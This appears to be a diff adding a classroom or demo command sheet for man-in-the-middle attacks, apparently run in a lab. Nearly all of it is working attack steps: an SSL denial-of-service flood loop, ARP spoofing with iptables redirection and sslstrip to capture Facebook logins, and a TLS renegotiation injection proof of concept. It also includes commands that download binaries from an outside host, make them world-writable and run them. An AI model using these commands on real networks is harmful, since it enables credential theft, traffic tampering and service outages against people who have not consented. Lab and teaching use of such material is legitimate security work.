@@ -1,0 +1,92 @@
+Gateway: 192.168.0.1
+VM: 192.168.0.8
+Host: 192.168.0.12
+
+Sniffing
+wireshark
+wget http://mitm.azurewebsites.net/AzureSite/files/http_client.bin
+wget http://mitm.azurewebsites.net/AzureSite/files/tcp_client.bin
+wget http://mitm.azurewebsites.net/AzureSite/files/https_client.bin
+
+sudo chmod 777 http_client
+
+http_client
+
+*********************************
+
+OpenSSL
+wget http://mitm.azurewebsites.net/AzureSite/files/openssl_decrypt_homework.tar.gz
+tar -xzvf openssl_decrypt_homework.tar.gz
+openssl rsautl -decrypt -in important_message_encrypted -out plaintext -inkey my.key
+
+sslscan 138.91.119.153
+wireshark ip.src == 192.168.0.8
+openssl s_client -connect 138.91.119.153:443 -cipher EXP-RC4-MD5
+
+*********************************
+
+SSL DOS
+openssl s_client -connect 137.117.84.81:443 -cipher EXP-RC4-MD5
+GET / HTTP/1.1
+
+go to 137.117.84.81
+thc-ssl-dos 137.117.84.81 443 --accept
+may need to clear cache
+go to 137.117.84.81
+
+http://138.91.119.153/cpu.txt
+for i in {1..4000}
+do 
+    2>/dev/null 1>/dev/null openssl s_client -connect 138.91.119.153:443 & 
+done
+for i in {1..4000}; do 2>/dev/null 1>/dev/null openssl s_client -connect 138.91.119.153:443 & done
+
+openssl s_client -connect 137.117.84.81:443 -cipher EXP-RC4-MD5
+R
+openssl s_client -connect 138.91.119.153:443 -cipher EXP-RC4-MD5
+R
+
+**************************************
+
+SSL Stripping
+
+USE FIREFOX
+show facebook
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+cat /proc/sys/net/ipv4/ip_forward
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1234
+sslstrip -p -l 1234 -f
+
+tail -f sslstrip.log
+
+arpspoof -i eth0 -t 192.168.0.12 192.168.0.1
+
+arpspoof -i eth0 -t 192.168.0.1 192.168.0.12
+
+show facebook and login
+
+*******************************************
+
+TLS Renegotiation
+
+https://191.238.51.50/mitm from VM and host
+http://191.238.51.50/log.txt
+
+wget http://mitm.azurewebsites.net/AzureSite/files/tls_demo.tar.gz
+tar -xzvf tls_demo.tar.gz
+cd tls/
+cp tls-renegotiation-poc.py /usr/bin/
+tar -xzvf tlslite-0.3.8.tar.gz
+cd tlslite-0.3.8/
+python setup.py install
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+cat /proc/sys/net/ipv4/ip_forward
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
+
+arpspoof -i eth0 -t 192.168.0.12 192.168.0.1
+arpspoof -i eth0 -t 192.168.0.1 192.168.0.12
+tls-renegotiation-poc.py -l 8080 -b 192.168.0.8 -t 191.238.51.50:443 --inject "GET /mitm/?m=InjectedMessage HTTP/1.1"
